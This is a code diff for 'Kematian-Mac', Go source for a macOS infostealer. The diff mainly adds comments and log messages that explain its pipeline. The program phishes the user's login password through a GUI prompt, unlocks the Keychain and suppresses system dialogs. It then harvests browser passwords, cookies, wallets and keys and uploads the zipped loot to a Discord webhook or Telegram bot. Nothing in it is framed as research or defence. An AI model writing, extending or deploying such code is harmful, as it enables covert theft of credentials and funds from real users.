@@ -1,5 +1,13 @@
-// Kematian-Mac: standalone macOS harvest binary (from Kematian-main recovery engine).
-// Collects browser credentials and related data, then uploads a zip to a Discord webhook.
+// Kematian-Mac — standalone macOS harvest binary.
+//
+// Pipeline (single run, then exit):
+//  1. Resolve upload destinations (Discord webhook and/or Telegram bot).
+//  2. Obtain the Mac login password (flag/env or GUI prompt) and prepare Keychain access.
+//  3. Harvest browser data, wallets, apps, keys, etc. via recovery.Collect.
+//  4. Zip results into ≤size-limit parts and upload in phases (primary → files → telegram).
+//
+// Credentials can be baked in at build time (-ldflags) or supplied at runtime.
+// This binary is darwin-only; Windows/Linux use a separate Overlord plugin.
 package main
 
 import (
@@ -12,7 +20,9 @@ import (
 	"recovery/recovery/crypto"
 )
 
-// Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
+// defaultWebhook is injected at link time:
+//
+//	-ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
 var defaultWebhook string
 
 func main() {
@@ -26,21 +36,30 @@ func main() {
 	quiet := flag.Bool("quiet", false, "minimal console output")
 	flag.Parse()
 
+	// Flag > env > build-time defaults (see upload_config.go).
 	uploadCfg := resolveUploadConfig(*webhookFlag, *telegramTokenFlag, *telegramChatFlag)
 
+	// Chromium passwords/cookies + keychain dump need the login Keychain.
+	// Password comes from modal / flag / env. If keychain is locked, unlock with that
+	// password; if already unlocked, skip unlock and proceed to harvest.
 	macPassword, err := acquireMacPassword(*macPasswordFlag, *noPromptFlag, *promptTitleFlag, *promptMessageFlag, *quiet)
 	if err != nil {
 		log.Fatalf("[kematian] password required: %v", err)
 	}
 	crypto.SetMacLoginPassword(macPassword)
 	if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
-		log.Fatalf("[kematian] keychain setup failed: %v", err)
+		log.Fatalf("[kematian] keychain unlock/setup failed: %v", err)
 	}
 	if !crypto.LoginKeychainUnlocked() {
 		log.Fatal("[kematian] keychain session not ready — cannot run harvest")
 	}
 	if !*quiet {
-		log.Printf("[kematian] keychain session mode active (no unlock-keychain — avoids system prompts)")
+		if crypto.LoginKeychainWasLocked() {
+			log.Printf("[kematian] login keychain was locked — unlocked with user password")
+		} else {
+			log.Printf("[kematian] login keychain already unlocked")
+		}
+		log.Printf("[kematian] silent keychain ACL applied — browser harvest should not show system password dialogs")
 	}
 
 	if runtime.GOOS != "darwin" {
@@ -65,6 +84,7 @@ func main() {
 		log.Fatalf("[kematian] harvest failed: %v", err)
 	}
 
+	// Phase 1: credentials/wallets; Phase 2: scanned files; Phase 3: Telegram tdata (if any).
 	if err := uploadAllHarvest(uploadCfg, hostname, payload, *quiet); err != nil {
 		log.Fatalf("[kematian] upload failed: %v", err)
 	}
@@ -75,6 +95,7 @@ func main() {
 	os.Exit(0)
 }
 
+// sanitizeFilename keeps only [A-Za-z0-9_-] for zip/upload basenames.
 func sanitizeFilename(s string) string {
 	var b strings.Builder
 	for _, r := range s {
